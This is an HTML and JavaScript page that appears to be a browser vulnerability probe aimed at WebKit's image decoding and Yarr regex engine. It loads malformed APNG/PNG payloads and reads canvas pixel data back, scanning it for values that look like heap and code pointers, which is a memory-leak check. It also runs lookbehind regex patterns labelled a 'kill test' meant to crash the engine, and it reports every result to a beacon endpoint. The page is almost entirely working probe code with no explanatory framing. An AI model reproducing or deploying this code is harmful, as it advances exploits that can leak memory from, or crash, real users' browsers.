<!--

<html><head><meta charset="utf-8"><title>P674B</title></head><body>
<h3>V674b real-APNG shapes (fdAT over-decl) + C-19 Yarr kill test</h3>
<script>
var BK='/beacon/';
function bk(t,m){ var im=new Image(); im.src=BK+'P674B-'+t+'|'+encodeURIComponent(String(m)).slice(0,140)+'?n='+Math.random(); }

function loadProbe(name, url, cb){
  var img = new Image(), done=false;
  function once(ok){ if(done) return; done=true; cb(img, ok); }
  img.onload = function(){ once(true); };
  img.onerror = function(){ bk(name+'-LOAD','ERR'); once(false); };
  setTimeout(function(){ if(!done){ bk(name+'-LOADTO','hang'); once(false); } }, 6500);
  img.src = '/payloads/' + url + '?n=' + Math.random();
}

function readRow(img, cb){
  var W0 = img.width|0, H0 = img.height|0;
  bk(img._nm+'-STAT', 'dims='+W0+'x'+H0);
  if(!(W0>0&&H0>0)){ cb(null); return; }
  var cv = document.createElement('canvas'); cv.width = W0; cv.height = H0;
  var g = cv.getContext('2d');
  if(!g){ bk(img._nm+'-CANVAS','no-ctx'); cb(null); return; }
  g.drawImage(img, 0, 0, W0, H0);
  var readRows = function(){
    try{
      var id = g.getImageData(0, 0, W0, 1);
      var d = (id && id.data) ? id.data : id;
      cb(d);
    }catch(e){ bk(img._nm+'-GID','ERR '+e.name+':'+String(e.message).slice(0,60)); cb(null); }
  };
  if(window.requestAnimationFrame) requestAnimationFrame(function(){ setTimeout(readRows,60); });
  else setTimeout(readRows,300);
}

function scan(name, d){
  if(!d){ bk(name,'nodata'); return; }
  var nz=0, heap=0, code=0, other=0;
  var n = Math.min(d.length, 65536);
  for(var i=0;i<n;i+=4){ if(d[i]||d[i+1]||d[i+2]||d[i+3]) nz++; }
  for(var j=0;j+8<=n;j+=8){
    var hiU = ((d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4])>>>0;
    if(hiU>=0x00000008 && hiU<=0x000000FF) heap++;
    else if(hiU>=0x00000001 && hiU<=0x00000007) code++;
    else if(d[j]||d[j+1]||d[j+2]||d[j+3]||d[j+4]||d[j+5]||d[j+6]||d[j+7]) other++;
  }
  bk(name,'nz4='+nz+' heap='+heap+' code='+code+' other8='+other);
}

// PNG/APNG shapes first (they can return junk but must not kill)
var Q=[
  ['APNGC','v674_apng_ctrl.png'],
  ['APNGS','v674_apng_slack.png'],
  ['APNGT','v674_apng_trunc.png'],
  ['MID','v674_multiidat.png']
];
function step(i){
  if(i>=Q.length){ bk('DONE','apng+yarr full'); return; }
  var nm=Q[i][0];
  loadProbe(nm, Q[i][1], function(img, ok){
    if(!ok){ step(i+1); return; }
    img._nm=nm;
    readRow(img, function(d){ scan(nm, d); step(i+1); });
  });
}

// C-19 Yarr {0}-elision: Kickazzman #41 pattern order; 14.10 (WK-1400-gen) predicted CLEAN
function tryRe(nm, pat){
  try{ var r=new RegExp(pat); bk('YR-'+nm,'ok='+r.test('ab')); }
  catch(e){ bk('YR-'+nm,'throw='+e.name); }
}
function yarr(){
  tryRe('CTRL','(?<=\\1(a))b');
  setTimeout(function(){
    tryRe('P1','(?<=\\1{0})(a)');
    setTimeout(function(){
      tryRe('P2','(?<=\\k<foo>{0})(?<foo>a)');
      setTimeout(pngs,200);
    },300);
  },300);
}
function pngs(){ bk('PNGSTART','go'); setTimeout(function(){ step(0); },150); }
bk('BOOT','v3');
yarr();
</script></body></html>
